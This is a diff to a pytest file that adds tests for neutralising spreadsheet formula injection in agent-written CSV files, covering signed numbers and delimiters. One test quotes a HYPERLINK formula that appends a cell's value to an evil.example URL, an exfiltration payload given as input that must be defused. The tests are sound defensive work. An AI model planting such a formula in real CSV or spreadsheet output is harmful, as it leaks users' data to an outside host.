@@ -1,11 +1,13 @@
-"""Agent deliverables in real formats: the Markdown model, the Word and PDF writers
-and the registry that picks one by extension. Files are opened with the same
-libraries a reader would use, never inspected as raw bytes."""
+"""Agent deliverables in real formats: the Markdown model, the Word and PDF writers,
+CSV kept safe to open in a spreadsheet, and the registry that picks one by
+extension. Files are opened with the same libraries a reader would use, never
+inspected as raw bytes."""
 
 from __future__ import annotations
 
+import csv
 import logging
-from io import BytesIO
+from io import BytesIO, StringIO
 from pathlib import Path
 
 import pytest
@@ -231,6 +233,59 @@ def test_the_registry_lists_every_format_an_agent_can_save() -> None:
 @pytest.mark.parametrize("extension", [".txt", ".md", ".json", ".csv", ".html"])
 def test_text_formats_are_saved_as_written(extension: str) -> None:
     assert render_artifact(extension, "Grüße <b>", NO_FONT) == "Grüße <b>".encode()
+
+
+# --- CSV: no cell a spreadsheet would run --------------------------------------
+
+
+def csv_cells(data: bytes, delimiter: str = ",") -> list[list[str]]:
+    """The cells a spreadsheet splitting on ``delimiter`` would show."""
+    return list(csv.reader(StringIO(data.decode(), newline=""), delimiter=delimiter))
+
+
+def test_csv_cells_a_spreadsheet_would_run_are_saved_as_text() -> None:
+    link = '=HYPERLINK("https://evil.example/?"&A1,"Open")'
+    content = f'name,link\nBob,"{link.replace(chr(34), chr(34) * 2)}"\n+1+2,@SUM(A1)\n-2+3,"\t=1"\n'
+
+    cells = csv_cells(render_artifact(".csv", content, NO_FONT))
+
+    assert cells == [
+        ["name", "link"],
+        ["Bob", f"'{link}"],
+        ["'+1+2", "'@SUM(A1)"],
+        ["'-2+3", "'\t=1"],
+    ]
+
+
+def test_csv_numbers_keep_their_sign() -> None:
+    content = "item,amount\nrefund,-12.5\nfee,+3\nloss,-1e6\nsum,=1+1\n"
+
+    cells = csv_cells(render_artifact(".csv", content, NO_FONT))
+
+    assert [row[1] for row in cells] == ["amount", "-12.5", "+3", "-1e6", "'=1+1"]
+
+
+def test_a_csv_is_neutralised_in_the_delimiter_it_was_written_with() -> None:
+    content = "name;formula\nBob;=1+1\nAnn;-4,5\n"
+
+    cells = csv_cells(render_artifact(".csv", content, NO_FONT), ";")
+
+    assert cells == [["name", "formula"], ["Bob", "'=1+1"], ["Ann", "-4,5"]]
+
+
+def test_a_formula_behind_another_delimiter_cannot_be_split_out() -> None:
+    # Written with commas; a spreadsheet that splits on semicolons would see "=1+1".
+    content = "a,b\nACME;=1+1,12\nNext;x,13\n"
+
+    data = render_artifact(".csv", content, NO_FONT)
+
+    assert csv_cells(data) == [["a", "b"], ["ACME;=1+1", "12"], ["Next;x", "13"]]
+    assert not any(cell.startswith("=") for row in csv_cells(data, ";") for cell in row)
+
+
+def test_a_csv_with_nothing_to_neutralise_is_saved_as_written() -> None:
+    content = "a;b\r\n1;-2\r\nx;y@example.com\r\n"
+    assert render_artifact(".csv", content, NO_FONT) == content.encode()
 
 
 def test_an_unknown_format_names_the_ones_that_exist() -> None:
